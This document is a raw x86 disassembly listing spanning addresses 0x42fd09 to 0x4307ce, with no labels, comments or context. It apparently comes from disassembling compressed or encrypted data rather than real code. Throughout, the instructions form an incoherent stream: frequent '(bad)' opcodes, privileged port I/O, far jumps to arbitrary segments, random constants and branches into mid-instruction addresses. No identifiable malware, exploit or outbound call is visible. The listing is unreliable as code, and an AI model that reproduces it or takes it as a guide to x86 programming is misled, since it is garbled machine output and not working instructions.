  42fd09:	xchg   edi,eax
  42fd0a:	cmp    al,0x36
  42fd0c:	or     DWORD PTR ds:0x33e44fff,ebp
  42fd12:	and    eax,0xc665a986
  42fd17:	jecxz  0x42fd08
  42fd19:	dec    edx
  42fd1a:	or     dh,dh
  42fd1c:	xchg   esp,eax
  42fd1d:	mov    DWORD PTR [edi-0x13],edi
  42fd20:	jno    0x42fd01
  42fd22:	mov    al,0x84
  42fd24:	aad    0xb4
  42fd26:	xlat   BYTE PTR ds:[ebx]
  42fd27:	aas    
  42fd28:	inc    ecx
  42fd29:	add    bl,0x21
  42fd2c:	sub    al,0xe
  42fd2e:	jecxz  0x42fd06
  42fd30:	xor    al,bh
  42fd32:	enter  0xfaf,0xa3
  42fd36:	push   cs
  42fd37:	loope  0x42fd1b
  42fd39:	bsf    ebp,ebx
  42fd3c:	pop    ds
  42fd3d:	aam    0x2b
  42fd3f:	(bad)  
  42fd40:	popf   
  42fd41:	jp     0x42fd9c
  42fd43:	mov    al,0x51
  42fd45:	out    0xd2,eax
  42fd47:	int    0x2e
  42fd49:	test   DWORD PTR [esi+0x6b],ecx
  42fd4c:	ds ret 0x84f6
  42fd50:	dec    eax
  42fd51:	pushf  
  42fd52:	jmp    0x6b56:0x8544b856
  42fd59:	retf   0x8b25
  42fd5c:	xor    eax,0xa98eaea8
  42fd61:	(bad)  
  42fd62:	sahf   
  42fd63:	add    dh,BYTE PTR [ebx+0x31]
  42fd66:	push   ebx
  42fd67:	addr16 push ds
  42fd69:	fstp   DWORD PTR [eax+ecx*4]
  42fd6c:	das    
  42fd6d:	imul   ebx,DWORD PTR [eax+0x37613d83],0x77
  42fd74:	nop
  42fd75:	cmp    ah,BYTE PTR [ecx-0x5b6821f0]
  42fd7b:	cdq    
  42fd7c:	cmp    ah,bl
  42fd7e:	xor    BYTE PTR [esi-0x9],cl
  42fd81:	mov    esp,0x3d084bb7
  42fd86:	adc    al,0xf9
  42fd88:	outs   dx,BYTE PTR ds:[esi]
  42fd89:	cmp    bh,bl
  42fd8b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42fd8d:	inc    ebp
  42fd8e:	or     DWORD PTR [esi],ebp
  42fd90:	inc    ebp
  42fd91:	adc    esi,ecx
  42fd93:	out    0xc2,eax
  42fd95:	add    al,0x80
  42fd97:	cmp    eax,eax
  42fd99:	ficomp WORD PTR [edi+0x4a]
  42fd9c:	adc    eax,0x2e6f5826
  42fda1:	dec    esp
  42fda2:	push   cs
  42fda3:	or     BYTE PTR [edi],ah
  42fda5:	jl     0x42fd2d
  42fda7:	cwde   
  42fda8:	pop    eax
  42fda9:	mov    edi,DWORD PTR [eax+eax*1+0x10ed9d42]
  42fdb0:	pop    ebx
  42fdb1:	mov    ecx,0xef47acea
  42fdb6:	jmp    0x2cb436d5
  42fdbb:	sti    
  42fdbc:	pop    ds
  42fdbd:	lahf   
  42fdbe:	out    0x1f,al
  42fdc0:	jae    0x42fdd6
	...
  42fe32:	add    BYTE PTR [eax],al
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	push   esi
  42fe41:	(bad)  
  42fe42:	(bad)  
  42fe43:	fmul   QWORD PTR [edx+edi*8+0x1]
  42fe47:	add    dh,dh
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    BYTE PTR [edx+0x1b],bl
  42fe4e:	fst    QWORD PTR [esi]
  42fe50:	xor    esp,esp
  42fe52:	ror    DWORD PTR [esi+0x65],0xd1
  42fe56:	mov    WORD PTR [edx-0x40cea6fc],es
  42fe5c:	sbb    al,0x1
  42fe5e:	inc    edi
  42fe5f:	idiv   DWORD PTR [esi]
  42fe61:	jmp    0xada:0x2cc3295c
  42fe68:	out    0xb7,al
  42fe6a:	rcl    BYTE PTR [ecx+0x336cb54b],1
  42fe70:	or     BYTE PTR [ebp+0x1e138a98],ah
  42fe76:	mov    dl,0x4f
  42fe78:	leave  
  42fe79:	nop
  42fe7a:	lock pop esp
  42fe7c:	dec    ebp
  42fe7d:	mov    dl,0xfe
  42fe7f:	add    BYTE PTR [edi-0x21],0x30
  42fe83:	sar    BYTE PTR [edx],0x6d
  42fe86:	sub    DWORD PTR [edx+0x76],esi
  42fe89:	int3   
  42fe8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe8b:	out    dx,eax
  42fe8c:	popa   
  42fe8d:	xchg   edx,eax
  42fe8e:	jmp    0x42fe6c
  42fe90:	scas   eax,DWORD PTR es:[edi]
  42fe91:	dec    edi
  42fe92:	gs push edx
  42fe94:	cmp    eax,0x49aa55e
  42fe99:	jmp    0xc9e4:0xba151754
  42fea0:	inc    ebx
  42fea1:	stos   BYTE PTR es:[edi],al
  42fea2:	and    al,0xc2
  42fea4:	push   0x4f
  42fea6:	sbb    al,0x15
  42fea8:	jb     0x42fed0
  42feaa:	add    DWORD PTR [eax],esi
  42feac:	(bad)  
  42fead:	jle    0x42feb3
  42feaf:	aaa    
  42feb0:	or     BYTE PTR [edx-0x2a],ch
  42feb3:	retf   0x9c91
  42feb6:	lea    edx,[ebx-0x47e5da0a]
  42febc:	arpl   WORD PTR [ebx-0x2406e138],si
  42fec2:	cdq    
  42fec3:	aam    0xc3
  42fec5:	or     BYTE PTR [esi],bl
  42fec7:	fs push edx
  42fec9:	push   0xffffffc3
  42fecb:	js     0x42ff1d
  42fecd:	or     BYTE PTR [ebx+0x19],cl
  42fed0:	hlt    
  42fed1:	or     BYTE PTR [ecx-0x6fef3608],0x94
  42fed8:	imul   BYTE PTR [ecx-0x542bc120]
  42fede:	push   0x61
  42fee0:	cs push eax
  42fee2:	popf   
  42fee3:	push   eax
  42fee4:	ret    0x5f0e
  42fee7:	call   0xde7c3b14
  42feec:	inc    ebp
  42feed:	jbe    0x42ff5a
  42feef:	ret    0xa5ba
  42fef2:	cmp    esp,DWORD PTR [edx+ebp*2-0x38]
  42fef6:	lods   eax,DWORD PTR ds:[esi]
  42fef7:	into   
  42fef8:	lods   al,BYTE PTR ds:[esi]
  42fef9:	pop    edi
  42fefa:	rol    BYTE PTR [ebx+0x62],1
  42fefd:	mov    fs,esp
  42feff:	fcmovbe st,st(3)
  42ff01:	or     eax,0x48b3f1d6
  42ff06:	mov    edi,0x996f4af8
  42ff0b:	pop    DWORD PTR [esi+eiz*8-0x6b1fc6e0]
  42ff12:	shl    DWORD PTR [ebp-0x1a],1
  42ff15:	popf   
  42ff16:	and    eax,DWORD PTR ss:[ecx]
  42ff19:	clc    
  42ff1a:	dec    esi
  42ff1b:	repz cwde 
  42ff1d:	cmp    DWORD PTR [edi+esi*1],eax
  42ff20:	xor    DWORD PTR [edx+0x53],0xf877baae
  42ff27:	popa   
  42ff28:	mov    dl,0x2
  42ff2a:	call   0x4fa6:0x95e7f2e1
  42ff31:	mov    edi,esi
  42ff33:	inc    edi
  42ff34:	dec    ecx
  42ff35:	imul   ebx,DWORD PTR [ebx-0x135b940c],0x3e
  42ff3c:	stos   BYTE PTR es:[edi],al
  42ff3d:	retf   
  42ff3e:	nop
  42ff3f:	arpl   WORD PTR [ebx+0x56],dx
	...
  42ffb1:	add    BYTE PTR [eax],al
  42ffb3:	add    BYTE PTR [edx],dl
  42ffb5:	ds int 0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx+0x60897fea]
  42ffc1:	enter  0xf2e8,0x42
  42ffc5:	sti    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	test   BYTE PTR [eax],0x0
  42ffcb:	add    BYTE PTR [esi],dl
  42ffcd:	and    DWORD PTR [ecx],edi
  42ffcf:	dec    esi
  42ffd0:	adc    al,0x21
  42ffd2:	push   ebp
  42ffd3:	in     eax,dx
  42ffd4:	add    eax,0x19a49645
  42ffd9:	scas   al,BYTE PTR es:[edi]
  42ffda:	out    dx,al
  42ffdb:	fidiv  DWORD PTR ds:0xf7d06caa
  42ffe1:	jle    0x42ffde
  42ffe3:	imul   ebp,DWORD PTR [ebx+0x20b5c7b4],0x5
  42ffea:	and    eax,0x2147200f
  42ffef:	pop    eax
  42fff0:	inc    ebp
  42fff1:	mov    eax,ds:0x2d1b71a0
  42fff6:	dec    eax
  42fff7:	mov    esp,0xf799eb29
  42fffc:	je     0x42ff81
  42fffe:	bound  esi,QWORD PTR [ecx-0x16]
  430001:	dec    eax
  430002:	inc    ecx
  430003:	mov    al,0x72
  430005:	js     0x430012
  430007:	out    0x92,al
  430009:	lea    esp,[ecx+ebx*2-0x25]
  43000d:	and    DWORD PTR ds:0xdaee5486,0x643ac0b9
  430017:	sub    eax,0x7fd203ea
  43001c:	dec    BYTE PTR [ebx]
  43001e:	add    eax,0xd4c40f1e
  430023:	push   esp
  430024:	xchg   ebp,eax
  430025:	pop    ecx
  430026:	xor    eax,0xde248ed4
  43002b:	xchg   edx,eax
  43002c:	push   ebx
  43002d:	and    eax,0xc6b4f002
  430032:	aam    0x2d
  430034:	sub    cl,BYTE PTR [esi+0x36]
  430037:	jne    0x430096
  430039:	les    ecx,FWORD PTR [edx]
  43003b:	mov    dh,0xca
  43003d:	or     bh,BYTE PTR [ebx+eax*2-0x29fb6e7f]
  430044:	stos   DWORD PTR es:[edi],eax
  430045:	imul   ebp,DWORD PTR [edi],0x20cc4b38
  43004b:	(bad)  
  43004d:	call   0xbe375bb4
  430052:	mov    bl,0xe0
  430054:	and    al,0x6d
  430056:	mov    esi,0x7a383d29
  43005b:	xchg   BYTE PTR [ecx+ecx*8-0x39],dl
  43005f:	dec    ebx
  430060:	pop    ss
  430061:	retf   0x6065
  430064:	mov    al,ds:0xf8dca0c2
  430069:	mov    dh,0xb3
  43006b:	jp     0x430063
  43006d:	dec    edx
  43006e:	add    bl,BYTE PTR [edx]
  430070:	out    0x70,eax
  430072:	(bad)  
  430073:	jp     0x4300a8
  430075:	mov    ah,0xe8
  430077:	xor    DWORD PTR [ebp-0x3a],0xf1f51c61
  43007e:	mov    ds:0xdc9f8f9a,al
  430083:	inc    ecx
  430084:	and    BYTE PTR [edi],dl
  430086:	in     eax,0x1c
  430088:	test   al,dl
  43008a:	cdq    
  43008b:	push   ds
  43008c:	fcmovu st,st(2)
  43008e:	sbb    ah,BYTE PTR [esi]
  430090:	test   BYTE PTR [ecx+edx*2+0x7f0b8708],bh
  430097:	xchg   ecx,eax
  430098:	(bad)  
  430099:	xlat   BYTE PTR ds:[ebx]
  43009a:	add    DWORD PTR [ecx],ebp
  43009c:	das    
  43009d:	cmp    ecx,DWORD PTR [edx-0x78e7702d]
  4300a3:	gs or  eax,0x62c25975
  4300a9:	mov    eax,0xc7b34f5e
  4300ae:	jl     0x430055
  4300b0:	jno    0x430074
  4300b2:	dec    eax
  4300b3:	push   esi
  4300b4:	clc    
  4300b5:	jne    0x4300ce
  4300b7:	lods   eax,DWORD PTR ds:[esi]
  4300b8:	pushf  
  4300b9:	mov    eax,DWORD PTR [ecx-0x354c2490]
  4300bf:	loope  0x43010e
  4300c1:	je     0x4300c3
	...
  430133:	add    BYTE PTR [edx+0x26],bl
  430136:	jecxz  0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0xc477:0x34cca608
  430144:	cmp    ah,bh
  430146:	add    DWORD PTR [eax],eax
  430148:	test   BYTE PTR [eax],0x0
  43014b:	add    BYTE PTR [ebx-0xfd2fea8],dh
  430151:	dec    ebx
  430152:	cdq    
  430153:	cld    
  430154:	imul   ecx,ecx,0xffffffff
  430157:	or     BYTE PTR [ebx+edi*1],bh
  43015a:	fsubr  DWORD PTR [edx]
  43015c:	push   edi
  43015d:	dec    esi
  43015e:	outs   dx,DWORD PTR ds:[esi]
  43015f:	cmp    DWORD PTR [edi-0xd],ebx
  430162:	adc    edx,ecx
  430164:	mov    ebx,0x8d36782
  430169:	or     ebp,0x13aa6e10
  43016f:	popa   
  430170:	add    eax,0x466d230a
  430175:	xlat   BYTE PTR ds:[ebx]
  430176:	xchg   ebp,eax
  430177:	inc    eax
  430178:	add    DWORD PTR [esi-0x3],esp
  43017b:	retf   0xcbc0
  43017e:	dec    ebp
  43017f:	inc    ecx
  430180:	jecxz  0x430108
  430182:	jmp    0x430133
  430184:	sti    
  430185:	jle    0x430182
  430187:	lods   al,BYTE PTR ds:[esi]
  430188:	pop    ds
  430189:	sub    al,0xe6
  43018b:	push   0xffffffa6
  43018d:	adc    eax,0x873c1053
  430192:	dec    ebp
  430193:	jle    0x43020e
  430195:	mov    cl,bl
  430197:	imul   esi,DWORD PTR [ecx+0xf],0xfffffffa
  43019b:	xchg   ecx,eax
  43019c:	add    esp,ecx
  43019e:	mov    bh,0x73
  4301a0:	xor    bl,0xc5
  4301a3:	jo     0x43016b
  4301a5:	jg     0x430156
  4301a7:	lods   eax,DWORD PTR ds:[esi]
  4301a8:	add    dh,BYTE PTR [ebx]
  4301aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301ab:	add    DWORD PTR [edi],ecx
  4301ad:	xor    eax,0x7c5f6f64
  4301b2:	int3   
  4301b3:	pop    es
  4301b4:	arpl   bp,si
  4301b6:	mov    cl,0xbc
  4301b8:	xor    esp,DWORD PTR [esi]
  4301ba:	div    BYTE PTR [ebp+0x2415a810]
  4301c0:	mov    cl,0x51
  4301c2:	xor    ch,BYTE PTR [eax-0x2fe1b43b]
  4301c8:	push   ebx
  4301c9:	mov    esp,0x38c9a9b0
  4301ce:	and    ch,BYTE PTR [ebx]
  4301d0:	pop    ss
  4301d1:	pop    ecx
  4301d2:	in     al,dx
  4301d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301d4:	pushaw 
  4301d6:	mov    esi,0x6ab2e65b
  4301db:	mov    eax,0xdd7da471
  4301e0:	aas    
  4301e1:	adc    al,0x8d
  4301e3:	inc    esp
  4301e4:	mov    BYTE PTR ds:0x53672aa5,al
  4301ea:	sbb    eax,0x343ff74b
  4301ef:	jmp    0x430219
  4301f1:	ret    
  4301f2:	cdq    
  4301f3:	and    al,0x32
  4301f5:	xchg   edx,eax
  4301f6:	jb     0x4301fd
  4301f8:	loop   0x43024c
  4301fa:	inc    BYTE PTR [eax+0xb]
  4301fd:	or     al,0x1c
  4301ff:	mov    esi,0xc45168c1
  430204:	xor    BYTE PTR [ebx*1+0x35603f5a],ah
  43020b:	jno    0x43021b
  43020d:	shl    ch,cl
  43020f:	sbb    al,0xbd
  430211:	cwde   
  430212:	push   esi
  430213:	rcr    DWORD PTR [esi-0x5d],cl
  430216:	outs   dx,BYTE PTR ds:[esi]
  430217:	adc    edx,eax
  430219:	in     eax,dx
  43021a:	and    esp,ebx
  43021c:	and    esi,DWORD PTR [ecx+0x755bc998]
  430222:	push   ebp
  430223:	or     BYTE PTR [ebp+esi*2-0x6256b015],cl
  43022a:	pop    es
  43022b:	jmp    0xa3d52e42
  430230:	add    edx,DWORD PTR [edx+0x73cf677c]
  430236:	sbb    DWORD PTR [edi],esi
  430238:	xchg   edx,eax
  430239:	xor    BYTE PTR [ebx-0x7c1d514b],bh
  43023f:	add    cl,BYTE PTR [ecx]
  430241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	cmp    DWORD PTR [edx-0x2d1feb4],0x1
  4302c7:	add    dh,dh
  4302c9:	add    BYTE PTR [eax],al
  4302cb:	add    BYTE PTR [edx+0x43],bh
  4302ce:	pslld  mm6,QWORD PTR [edx+0x2224f397]
  4302d5:	push   es
  4302d6:	add    esp,DWORD PTR [esi+0x4e420293]
  4302dc:	shl    edx,0xd9
  4302df:	mov    ebp,0x916090
  4302e4:	in     al,0x23
  4302e6:	int    0x94
  4302e8:	shl    DWORD PTR [edx-0x61a7a7ae],0x2e
  4302ef:	fidiv  DWORD PTR [ecx-0x7e76faf4]
  4302f5:	pop    ss
  4302f6:	jbe    0x4302f9
  4302f8:	jns    0x4302ac
  4302fa:	cmp    BYTE PTR ds:0x3d9ee715,ah
  430300:	es inc ecx
  430302:	cmp    al,0xba
  430304:	xchg   edi,eax
  430305:	lock popa 
  430307:	push   ds
  430308:	mov    ah,0x6e
  43030a:	or     BYTE PTR [edi],bh
  43030c:	scas   eax,DWORD PTR es:[edi]
  43030d:	out    0x1a,al
  43030f:	int3   
  430310:	push   0x29
  430312:	push   cs
  430313:	mov    ecx,0x50a84eb8
  430318:	mov    esi,0xb785a6f6
  43031d:	xchg   ecx,eax
  43031e:	push   ss
  43031f:	sbb    al,ch
  430321:	jae    0x43033b
  430323:	sbb    eax,0x7a4f737f
  430328:	xlat   BYTE PTR ds:[ebx]
  430329:	xchg   BYTE PTR [eax+0x73e88cf6],dl
  43032f:	add    dh,BYTE PTR [eax+eiz*4+0x5c]
  430333:	mov    WORD PTR [eax+edi*2-0x5b42e6e3],fs
  43033a:	xchg   DWORD PTR [edx],edx
  43033c:	adc    edi,DWORD PTR [eax-0x78f07a34]
  430342:	mov    ds:0x7616b57f,eax
  430347:	daa    
  430348:	and    BYTE PTR [edi-0xd7450ea],ah
  43034e:	lods   eax,DWORD PTR ds:[esi]
  43034f:	or     DWORD PTR [ebp+0x5ef28150],0x12dcc09a
  430359:	test   eax,0xffec83bb
  43035e:	ret    
  43035f:	outs   dx,DWORD PTR ds:[esi]
  430360:	cmp    bh,BYTE PTR [esi-0x24]
  430363:	in     eax,0x21
  430365:	sub    al,0x17
  430367:	mov    al,0x78
  430369:	push   cs
  43036a:	stos   BYTE PTR es:[edi],al
  43036b:	push   cs
  43036c:	push   esi
  43036d:	mov    al,0xb
  43036f:	call   0xa83522d6
  430374:	xchg   ecx,eax
  430375:	cli    
  430376:	pop    esi
  430377:	adc    dh,BYTE PTR [ecx+0x7cd94fa3]
  43037d:	imul   edi,DWORD PTR [edi+ecx*1+0x466f6aae],0x6
  430385:	popa   
  430386:	or     al,0x93
  430388:	rcl    BYTE PTR [esi+0x25],1
  43038b:	idiv   dl
  43038d:	xor    DWORD PTR [ecx+0x2876a726],0xdc3a5af9
  430397:	xor    eax,0x920a2d57
  43039c:	das    
  43039d:	xor    bh,dh
  43039f:	sbb    ch,al
  4303a1:	jmp    FWORD PTR [esi]
  4303a3:	popa   
  4303a4:	jae    0x43037c
  4303a6:	adc    al,0x19
  4303a8:	mov    DWORD PTR ds:0x6faa894c,eax
  4303ae:	hlt    
  4303af:	fnstenv [ebp-0x32fdf787]
  4303b5:	iret   
  4303b6:	cmp    BYTE PTR [ecx+0x48],0x63
  4303ba:	pop    es
  4303bb:	out    0x1e,eax
  4303bd:	enter  0xdf8,0xe4
  4303c1:	push   0x0
	...
  430433:	add    BYTE PTR [edi],dh
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfe24:0x1bf8cd7c
  430446:	add    DWORD PTR [eax],eax
  430448:	test   BYTE PTR [eax],0x0
  43044b:	add    BYTE PTR [ecx],bl
  43044d:	pop    edx
  43044e:	add    BYTE PTR [esi+0x6400cbd],0x86
  430455:	arpl   WORD PTR [ecx],dx
  430457:	out    dx,al
  430458:	lahf   
  430459:	cmp    esi,edx
  43045b:	dec    ecx
  43045c:	pop    ebp
  43045d:	stc    
  43045e:	adc    al,0x6
  430460:	jg     0x430430
  430462:	pop    ss
  430463:	or     al,0xc9
  430465:	jbe    0x43045d
  430467:	into   
  430468:	jmp    0x430445
  43046a:	dec    ecx
  43046b:	ins    DWORD PTR es:[edi],dx
  43046c:	stos   BYTE PTR es:[edi],al
  43046d:	dec    edx
  43046e:	not    DWORD PTR [edx+0x6e]
  430471:	inc    edi
  430472:	xchg   ebp,eax
  430473:	in     al,0x5a
  430475:	retf   
  430476:	xor    DWORD PTR [eax+0x38d86718],0xffffffd2
  43047d:	sbb    eax,0x569e3d8e
  430482:	mov    bl,0xad
  430484:	icebp  
  430485:	sahf   
  430486:	xlat   BYTE PTR ds:[ebx]
  430487:	or     al,0x71
  430489:	sub    al,0xcc
  43048b:	mov    ebx,0x7333a8e8
  430490:	inc    ebp
  430491:	inc    edx
  430492:	fisubr DWORD PTR [ebp+0x7b]
  430495:	adc    al,0x5f
  430497:	inc    ebp
  430498:	mov    ch,0xe8
  43049a:	mov    eax,ds:0x36b5ebc2
  43049f:	sub    dl,al
  4304a1:	shl    edi,0x88
  4304a4:	or     al,0xca
  4304a6:	in     al,0x87
  4304a8:	push   ecx
  4304a9:	jae    0x430524
  4304ab:	getsec 
  4304ad:	cs push ebx
  4304af:	mov    al,0xd7
  4304b1:	sub    eax,0xee5fc468
  4304b6:	mov    edx,0x64e99026
  4304bb:	add    BYTE PTR [edi],bl
  4304bd:	jns    0x430448
  4304bf:	jmp    0x29d0:0x896ab40f
  4304c6:	les    ebx,FWORD PTR ds:0x3c9216e2
  4304cc:	xchg   ebp,eax
  4304cd:	out    0x51,eax
  4304cf:	push   esp
  4304d0:	out    dx,al
  4304d1:	dec    ebx
  4304d2:	push   ds
  4304d3:	mov    esp,0xf0b93653
  4304d8:	inc    ecx
  4304d9:	mov    edx,DWORD PTR [edi-0x1e2a236]
  4304df:	mov    eax,0x3cc95343
  4304e4:	mov    WORD PTR [esi-0x45],cs
  4304e7:	mov    esi,0x9ce27dc2
  4304ec:	clc    
  4304ed:	(bad)  
  4304ee:	jns    0x430485
  4304f0:	adc    al,0xab
  4304f2:	jno    0x4304be
  4304f4:	sbb    DWORD PTR [edx-0x5e],edx
  4304f7:	cmp    cl,BYTE PTR [ebp+0x46]
  4304fa:	sbb    ch,BYTE PTR [ebx]
  4304fc:	xchg   ebp,eax
  4304fd:	outs   dx,DWORD PTR ds:[esi]
  4304fe:	cmp    dh,BYTE PTR [edi-0x1ee078eb]
  430504:	lods   al,BYTE PTR ds:[esi]
  430505:	sub    BYTE PTR gs:[eax-0x8],ah
  430509:	dec    ebp
  43050a:	cmp    BYTE PTR [edi+0x6573e3e7],ch
  430510:	mov    edx,0x13ae0364
  430515:	retf   0xcb2f
  430518:	lods   eax,DWORD PTR ds:[esi]
  430519:	and    al,0xd2
  43051b:	shr    DWORD PTR [edx-0x2],0x17
  43051f:	cs fwait
  430521:	adc    eax,0x530aab98
  430526:	cmp    DWORD PTR [edx+0x51531d04],edi
  43052c:	neg    BYTE PTR [ebp-0x2d]
  43052f:	jo     0x430570
  430531:	jnp    0x4304ec
  430533:	rcl    DWORD PTR [ebx-0x7d],0x68
  430537:	jl     0x4304ba
  430539:	enter  0x31f5,0xd2
  43053d:	pusha  
  43053e:	push   edi
  43053f:	ins    BYTE PTR es:[edi],dx
  430540:	xchg   ebp,eax
  430541:	add    BYTE PTR cs:[eax],al
	...
  4305b4:	ds push esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x58]
  4305c1:	xchg   DWORD PTR [edi+0xc],edx
  4305c4:	sbb    bh,bh
  4305c6:	add    DWORD PTR [eax],eax
  4305c8:	test   BYTE PTR [eax],0x0
  4305cb:	add    BYTE PTR [ebx+eiz*2+0x4710e11c],bh
  4305d2:	sbb    DWORD PTR [edi-0x32],0xbbf7a7e5
  4305d9:	jne    0x4305cf
  4305db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305dc:	mov    dh,0xd4
  4305de:	push   ebx
  4305df:	push   ds
  4305e0:	es xchg ecx,eax
  4305e2:	(bad)  
  4305e3:	out    dx,eax
  4305e4:	or     BYTE PTR [ebp+edx*2+0x2032fd63],bl
  4305eb:	daa    
  4305ec:	mov    al,0xd8
  4305ee:	arpl   WORD PTR [ebx+ebp*1+0x6864267d],si
  4305f5:	add    BYTE PTR [edi+0xc],dl
  4305f8:	inc    ecx
  4305f9:	les    esi,FWORD PTR [ebx+0x88e6e1d]
  4305ff:	push   ebp
  430600:	daa    
  430601:	pop    esi
  430602:	retf   
  430603:	lock retf 
  430605:	sbb    DWORD PTR [ebp+0x38],ecx
  430608:	jnp    0x43063e
  43060a:	dec    ebp
  43060b:	adc    ebx,DWORD PTR [eax]
  43060d:	adc    BYTE PTR [ecx+0x62],al
  430610:	sub    al,0xe8
  430612:	jb     0x430622
  430614:	dec    BYTE PTR [edx-0x5a3e2a25]
  43061a:	neg    BYTE PTR [edi-0x207e6458]
  430620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430621:	xor    esi,esp
  430623:	or     edi,edi
  430625:	cld    
  430626:	fisttp DWORD PTR [edx]
  430628:	(bad)  
  430629:	in     eax,dx
  43062a:	jbe    0x4306a4
  43062c:	push   es
  43062d:	outs   dx,BYTE PTR ds:[esi]
  43062e:	clc    
  43062f:	call   0x5232fd20
  430634:	add    al,0x17
  430636:	std    
  430637:	and    ebp,esp
  430639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43063a:	xchg   edx,eax
  43063b:	loope  0x4305c9
  43063d:	jae    0x43067b
  43063f:	jecxz  0x430671
  430641:	je     0x430699
  430643:	outs   dx,DWORD PTR ds:[esi]
  430644:	(bad)  
  430645:	mov    ebx,0xc6cf75af
  43064a:	outs   dx,BYTE PTR ds:[esi]
  43064b:	dec    ecx
  43064c:	pop    ds
  43064d:	out    0x17,eax
  43064f:	sbb    al,0x55
  430651:	repnz mov ecx,0xdb5363a8
  430657:	outs   dx,DWORD PTR ds:[esi]
  430658:	inc    eax
  430659:	aad    0x25
  43065b:	xchg   ebx,eax
  43065c:	in     eax,dx
  43065d:	push   ebp
  43065e:	cli    
  43065f:	xchg   edx,eax
  430660:	outs   dx,DWORD PTR ds:[esi]
  430661:	je     0x43065f
  430663:	clc    
  430664:	jecxz  0x43069b
  430666:	psubsw mm1,QWORD PTR ds:0x5551684c
  43066d:	mov    bl,0xb7
  43066f:	push   es
  430670:	repz push ds
  430672:	mov    eax,ds:0xa2414aff
  430677:	mov    eax,ds:0x4a2cb4bc
  43067c:	(bad)  
  43067d:	push   ebp
  43067e:	test   DWORD PTR [eax],esp
  430680:	cmp    esi,DWORD PTR [ecx+0x52512d67]
  430686:	or     BYTE PTR [ecx+0x529dd3b7],cl
  43068c:	dec    esi
  43068d:	in     al,dx
  43068e:	cmp    BYTE PTR [ebx],dh
  430690:	sbb    eax,0xc7de78d1
  430695:	(bad)  
  430696:	mov    ecx,0x8f9678a2
  43069b:	mov    dh,0x24
  43069d:	idiv   DWORD PTR [eax+0x1953eff1]
  4306a3:	xchg   ecx,eax
  4306a4:	jmp    0xd5a0:0xea7d94ba
  4306ab:	add    BYTE PTR [eax+0x1070c63c],ah
  4306b1:	inc    ebx
  4306b2:	dec    ebx
  4306b3:	aas    
  4306b4:	mov    edi,0x4a6ca727
  4306b9:	adc    BYTE PTR [edi+esi*1],ah
  4306bc:	xor    ecx,DWORD PTR [edi+esi*1+0x4f]
  4306c0:	clc    
  4306c1:	add    BYTE PTR ss:[eax],al
	...
  430734:	jno    0x4306d7
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0xa6
  430741:	(bad)  
  430742:	(bad)  
  430743:	dec    ecx
  430744:	adc    BYTE PTR [eax],al
  430746:	add    al,BYTE PTR [eax]
  430748:	test   BYTE PTR [eax],0x0
  43074b:	add    BYTE PTR [esi],dh
  43074d:	(bad)  
  43074e:	test   al,0x9e
  430750:	push   edx
  430751:	dec    ecx
  430752:	call   0x6e3590ab
  430757:	les    esp,FWORD PTR [ebx-0x4e]
  43075a:	push   ds
  43075b:	in     eax,0x95
  43075d:	dec    BYTE PTR [edx+0x69]
  430760:	adc    DWORD PTR [ecx],edi
  430762:	mov    esi,0x6ea50478
  430767:	push   ss
  430768:	comiss xmm6,DWORD PTR [ebp-0x3aa34b23]
  43076f:	push   0xffffffc5
  430771:	mov    eax,0x528f525f
  430776:	lds    edx,FWORD PTR [esi]
  430778:	stos   DWORD PTR es:[edi],eax
  430779:	xchg   esp,eax
  43077a:	dec    BYTE PTR [esi+ebp*8-0x76d0721a]
  430781:	leave  
  430782:	dec    edi
  430783:	inc    edi
  430784:	fadd   QWORD PTR [edx+edx*2]
  430787:	out    0x81,eax
  430789:	jge    0x43074d
  43078b:	stc    
  43078c:	gs js  0x4307bc
  43078f:	aas    
  430790:	and    edx,esp
  430792:	add    BYTE PTR [esi+ebp*8+0x28beb3c],dl
  430799:	stc    
  43079a:	ja     0x430765
  43079c:	and    esi,esi
  43079e:	out    dx,al
  43079f:	jmp    0xb7e5ea71
  4307a4:	loopne 0x4307a4
  4307a6:	bound  ecx,QWORD PTR [eax+0x7c]
  4307a9:	loopne 0x430822
  4307ab:	pop    ebp
  4307ac:	test   edi,esi
  4307ae:	iret   
  4307af:	dec    eax
  4307b0:	popf   
  4307b1:	loope  0x430781
  4307b3:	icebp  
  4307b4:	jae    0x4307b8
  4307b6:	mov    WORD PTR [eax+0x77],?
  4307b9:	(bad)  
  4307ba:	imul   BYTE PTR [edi]
  4307bc:	pop    DWORD PTR [eax+0x7429a42a]
  4307c2:	push   ds
  4307c3:	adc    eax,0x694c374e
  4307c8:	dec    edx
  4307c9:	enter  0xc701,0x47
  4307cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4307ce:	sub    eax,0xaeec5217
